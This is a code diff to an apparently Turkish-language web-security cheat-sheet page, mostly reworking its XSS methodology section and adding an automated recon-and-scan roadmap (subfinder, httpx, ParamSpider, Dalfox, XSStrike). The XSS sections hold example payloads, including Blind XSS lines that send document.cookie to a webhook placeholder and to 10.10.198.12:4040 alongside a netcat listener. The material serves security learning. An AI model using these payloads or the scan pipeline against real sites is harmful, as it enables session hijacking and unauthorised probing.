@@ -745,7 +745,8 @@ forum: {
                         <input type="password" id="password-input" placeholder="Parolanız" required style="width:100%; margin-bottom:10px; padding:10px; border-radius:8px; border:1px solid var(--glass); background:var(--bg); color:white;">
                         <div class="tool-buttons">
                             <button type="submit" id="login-email-btn">Giriş Yap</button>
-                            <button type="button" id="register-email-btn">Kaydol</button>
+                            <button type="button" id="register-email-btn" **disabled**>Kaydol</button>
+                            <p class="small-info" style="font-size: 0.8em; color: #aaa; margin-top: 5px;">*Kayıtlar şimdilik kapalıdır.</p>
                         </div>
                     </form>
                 </div>
@@ -927,38 +928,25 @@ xss: {
     title: 'XSS - Cross Site Scripting',
     description: 'Reflected, Stored, DOM ve Blind XSS türleri için kısa metodoloji.',
     sections: [
-        {
-            title: 'Reflected XSS',
-            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Tarayıcıda JavaScript kodu çalıştırılarak ortaya çıkan zafiyet türüdür. Girdi alanlarında ve URL parametrelerinde denenebilir.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><code>example.com/search?q=test'</code> → Sayfa kaynağını görüntüle (CTRL+U) → 'test' kelimesini arat. Payload sunucu tarafından encode ediliyor mu kontrol et.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Eğer girdi encode edilmiyorsa, <code>"/></code> gibi karakterlerle mevcut HTML etiketini kapatıp kendi script kodumuzu enjekte edebiliriz.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Örnek Payload: <code>&lt;img src=x onerror=alert("XSS")&gt;</code></li>
-            </ul>`
-        },
-        {
-            title: 'Stored XSS',
-            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Sayfayı ziyaret eden herkesi etkileyen kalıcı XSS türüdür.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Kullanıcıdan girdi alınan (yorum, profil bilgisi, mesaj vb.) ve veritabanına kaydedilen her yerde denenebilir.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Örnek Payload: <code>&lt;a href='javascript:alert(document.cookie);'&gt;Click Me&lt;/a&gt;</code></li>
-            </ul>`
-        },
-        {
-            title: 'DOM XSS',
-            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Tarayıcı tarafında, JavaScript ile kullanıcıdan gelen verinin (URL hash, search, localStorage vb.) DOM'a güvenli olmayan bir şekilde yazdırılmasıyla oluşur.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Tehlikeli fonksiyonlar (sink): <code>innerHTML</code>, <code>document.write</code>, <code>eval()</code>, <code>insertAdjacentHTML</code>.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Hızlı test: URL'deki hash (#) veya query (?) parametresini değiştirin. Eğer bu değer sayfada bir yere yazılıyorsa, kaynak kodunu inceleyerek hangi fonksiyonun kullanıldığını kontrol edin. <code>textContent</code> güvenli iken <code>innerHTML</code> tehlikelidir.</li>
-            </ul>`
-        },
-        {
-            title: 'Blind XSS',
-            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Payload'ın başka bir kullanıcı (genellikle admin) tarafından ve farklı bir sayfada (örn: admin paneli) tetiklenmesiyle oluşan XSS türüdür. Anında sonuç görülmez.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><code>&quot;&gt;&lt;script src=https://xss.hunter.com&gt;&lt;/script&gt;</code><br>Bu kod, tetiklendiğinde size bildirim gönderen harici bir JS dosyası çağırır.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Terminal: <code>nc -nvlp 4040</code><br>Payload:<code>&lt;/textarea&gt;&lt;script&gt;fetch('http://10.10.198.12:4040?cookie=' + btoa(document.cookie) );&lt;/script&gt;</code><br>Bu payload, tetiklendiği kullanıcının çerezlerini Base64 ile kodlayıp saldırganın sunucusuna gönderir.</li>
-            </ul>`
+            {
+                "title": "Reflected XSS",
+                "content": "<ul style=\"list-style:none;padding:0;margin:0;display:grid;gap:8px\">\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Tarayıcıda JavaScript kodu çalıştırılarak ortaya çıkan zafiyet türüdür. Girdi alanlarında ve URL parametrelerinde denenebilir.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><code>example.com/search?q=test'</code> &rarr; Sayfa kaynağını görüntüle (CTRL+U) &rarr; 'test' kelimesini arat. Payload sunucu tarafından encode ediliyor mu kontrol et.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Eğer girdi encode edilmiyorsa, <code>\"/></code> gibi karakterlerle mevcut HTML etiketini kapatıp kendi script kodumuzu enjekte edebiliriz.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Örnek Payload: <code>&lt;img src=x onerror=alert('XSS')&gt;</code></li>\n\t\t\t</ul>"
+            },
+            {
+                "title": "Stored XSS",
+                "content": "<ul style=\"list-style:none;padding:0;margin:0;display:grid;gap:8px\">\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Sayfayı ziyaret eden herkesi etkileyen kalıcı XSS türüdür.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Kullanıcıdan girdi alınan (yorum, profil bilgisi, mesaj vb.) ve veritabanına kaydedilen her yerde denenebilir.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Örnek Payload: <code>&lt;a href='javascript:alert(document.cookie);'&gt;Click Me&lt;/a&gt;</code></li>\n\t\t\t</ul>"
+            },
+            {
+                "title": "DOM XSS",
+                "content": "<ul style=\"list-style:none;padding:0;margin:0;display:grid;gap:8px\">\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Tarayıcı tarafında, JavaScript ile kullanıcıdan gelen verinin (URL hash, search, localStorage vb.) DOM'a güvenli olmayan bir şekilde yazdırılmasıyla oluşur.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Tehlikeli fonksiyonlar (sink): <code>innerHTML</code>, <code>document.write</code>, <code>eval()</code>, <code>insertAdjacentHTML</code>.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Hızlı test: URL'deki hash (#) veya query (?) parametresini değiştirin. Eğer bu değer sayfada bir yere yazılıyorsa, kaynak kodunu inceleyerek hangi fonksiyonun kullanıldığını kontrol edin. <code>textContent</code> güvenli iken <code>innerHTML</code> tehlikelidir.</li>\n\t\t\t</ul>"
+            },
+            {
+                "title": "Blind XSS",
+                "content": "<ul style=\"list-style:none;padding:0;margin:0;display:grid;gap:8px\">\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Payload'ın başka bir kullanıcı (genellikle admin) tarafından ve farklı bir sayfada (örn: admin paneli) tetiklenmesiyle oluşan XSS türüdür. Anında sonuç görülmez.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><b>Webhook Kullanımı:</b> XSS'in tetiklendiğini anlamak için dışarıya veri gönderme mekanizmasıdır. Payload'ın tetiklendiği cihazın IP, User-Agent veya Cookie bilgilerini saldırganın dinleme noktasına (örn: <code>webhook.site</code>) iletir.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Örnek Webhook Payload (Çerez çalma):<br><code>&lt;/textarea&gt;&lt;script&gt;new Image().src='https://[WEBHOOK_ADRESINIZ]?cookie='+document.cookie;&lt;/script&gt;</code></li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Basit Blind Test Payload: <code>&quot;&gt;&lt;script src=https://xss.hunter.com&gt;&lt;/script&gt;</code></li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">Netcat ile Test: <code>nc -nvlp 4040</code> (Terminalde dinleme)<br>Payload:<code>&lt;/textarea&gt;&lt;script&gt;fetch('http://10.10.198.12:4040?cookie=' + btoa(document.cookie) );&lt;/script&gt;</code> (Çerezleri Base64 ile kodlayıp gönderir.)</li>\n\t\t\t</ul>"
+            },
+{
+            "title": "Roadmap - Otomatik Test Akışı",
+            "content": "<ul style=\"list-style:none;padding:0;margin:0;display:grid;gap:8px\">\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\">XSS taramalarına başlamadan önce hedef domainin alt alanlarını, canlı URL'lerini ve parametrelerini otomatik olarak toplama adımları.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><b>1. Alt Alan ve Canlı URL Toplama:</b><br>Tüm alt alanları topla, sadece 200 (OK) dönenleri <code>status200.txt</code> dosyasına kaydet.\n\t\t\t\t\t<div style=\"position:relative;margin-top:5px\">\n\t\t\t\t\t\t<pre style=\"margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)\">subfinder -d example.com -silent -o subdomains.txt\ncat subdomains.txt | httpx -silent -o live_subdomains.txt\ncat live_subdomains.txt | httpx -status-code -mc 200 -silent > status200.txt</pre>\n\t\t\t\t\t\t<button style=\"position:absolute;top:5px;right:5px;padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6\"\n\t\t\t\t\t\t\tonclick=\"(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)\">💥</button>\n\t\t\t\t\t</div>\n\t\t\t\t</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><b>2. Yansıtılan Parametreleri Bulma (Parameter-Reflect-Finder):</b><br>Canlı URL'lerde yansıtma yapan parametreleri tespit et. Çıkan sorgulara <code>jUbAeR'\"<></code> payload'ı ile manuel test et.\n\t\t\t\t\t<div style=\"position:relative;margin-top:5px\">\n\t\t\t\t\t\t<pre style=\"margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)\">cd parameter-reflect-finder/\npython3 tool.py [ALAN_ADI_VEYA_LISTE_VER]</pre>\n\t\t\t\t\t\t<button style=\"position:absolute;top:5px;right:5px;padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6\"\n\t\t\t\t\t\t\tonclick=\"(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)\">💥</button>\n\t\t\t\t\t</div>\n\t\t\t\t</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><b>3. Tüm Parametreleri Toplama (ParamSpider):</b><br>Canlı URL listesini döngüye alarak tüm olası parametreleri topla.\n\t\t\t\t\t<div style=\"position:relative;margin-top:5px\">\n\t\t\t\t\t\t<pre style=\"margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)\">cat status200.txt | while read line; do python3 paramspider.py -d $line -o output/; done</pre>\n\t\t\t\t\t\t<button style=\"position:absolute;top:5px;right:5px;padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6\"\n\t\t\t\t\t\t\tonclick=\"(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)\">💥</button>\n\t\t\t\t\t</div>\n\t\t\t\t</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><b>4. Otomatik XSS Taraması (Dalfox ve XSS Strike):</b><br>Toplanan parametreli URL'ler için Dalfox'u listeyle veya XSS Strike'ı tek URL/parametre için kullan.\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t<div style=\"position:relative;margin-top:5px\">\n\t\t\t\t\t\t<pre style=\"margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)\">dalfox file status200.txt -o dalfox_results.txt</pre>\n\t\t\t\t\t\t<button style=\"position:absolute;top:5px;right:5px;padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6\"\n\t\t\t\t\t\t\tonclick=\"(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)\">💥</button>\n\t\t\t\t\t</div>\n\n\t\t\t\t\t\n\t\t\t\t\t<div style=\"position:relative;margin-top:5px\">\n\t\t\t\t\t\t<pre style=\"margin:0;white-space:pre-wrap;padding:8px;padding-right:45px;border-radius:6px;background:rgba(0,0,0,0.2)\">python3 xsstrike.py -u https://example.com/?id=neon</pre>\n\t\t\t\t\t\t<button style=\"position:absolute;top:5px;right:5px;padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6\"\n\t\t\t\t\t\t\tonclick=\"(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)\">💥</button>\n\t\t\t\t\t</div>\n\t\t\t\t</li>\n\t\t\t</ul>"
         }
     ]
 },
@@ -1681,7 +1669,7 @@ openredirect: {
             content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
                 <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Domain Taklidi:</strong> Uygulama sadece kendi domainine izin veriyorsa: <code>https://hedef.com.kötüamaclisite.com</code> deneyin.</li>
                 <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Path Atlatma:</strong> <code>https://hedef.com/../kötüamaclisite.com</code> (Path normalizasyonu hatalarını sömürme).</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Ekstra Karakterler:</strong> <code>https:// kötüamaclisite.com</code> (Boşluk, tab gibi kontrolsüz karakterler ekleme).</li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Ekstra Karakterler:</strong> <code>https://kötüamaclisite.com</code> (Boşluk, tab gibi kontrolsüz karakterler ekleme).</li>
                 <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Data/Javascript URI:</strong> <code>javascript:alert(document.domain)</code> veya <code>data:text/html;base64,...</code> deneyerek XSS'e çevirmeye çalışın.</li>
             </ul>`
         },
@@ -2614,7 +2602,6 @@ function renderMenu() {
         </div>
     `;
     
-    // BURADAN İTİBAREN YENİ YARDIMCI FONKSİYONLAR GELİYOR. ESKİ `quickLinks` KODUNUN YERİNİ ALMALI.
     
     function generateFlowCard(icon, title, pageKey, desc, color) {
         return `<div class="card" data-page="${pageKey}" onclick="showPage('${pageKey}')" style="border-left: 3px solid ${color}; cursor: pointer; display: flex; align-items: center; justify-content: space-between; padding: 15px;">
@@ -2635,25 +2622,17 @@ function renderMenu() {
             </div>
         </div>`;
     }
-
-    // Quick Links'i manuel olarak ekliyoruz, artık statik HTML'de yok.
-    // Bu kod parçası, normalde quickLinks'i render eden JS bloğunun yerine geçmeli.
-    const container1 = document.querySelector('.hero').nextElementSibling.nextElementSibling.nextElementSibling; // Sizin özel yapınızdaki quickLinks container'ını bulur.
+    const container1 = document.querySelector('.hero').nextElementSibling.nextElementSibling.nextElementSibling;
     
     if (container1) {
-        // Yeni tasarımda bu bloklar statik HTML içinde olduğu için bu kısım artık sadece arama/navigasyonu yeniden bağlamak için kullanılır.
-        
-        // Yeni tasarımdaki kartlara tıklama olayını bağlama (generateFlowCard ve generateTargetCard ile oluşturulanlar için)
         document.querySelectorAll('div[data-page]').forEach(el => {
             el.addEventListener('click', () => showPage(el.dataset.page));
         });
     }
 
-    // Arama kutusunu aktive etmek için gerekli kod bloğu aşağıdadır.
     const searchInput = document.getElementById('searchInput');
     const suggestionsDiv = document.getElementById('searchSuggestions');
     let selectedIndex = -1;
-    // ... (Arama fonksiyonlarının geri kalanı aynı kalacaktır)
 
     if (searchInput) {
         const searchHandler = function(e) {
@@ -4159,5 +4138,4 @@ document.addEventListener('DOMContentLoaded', () => {
     </div>
     </body>
   </html>
-
 
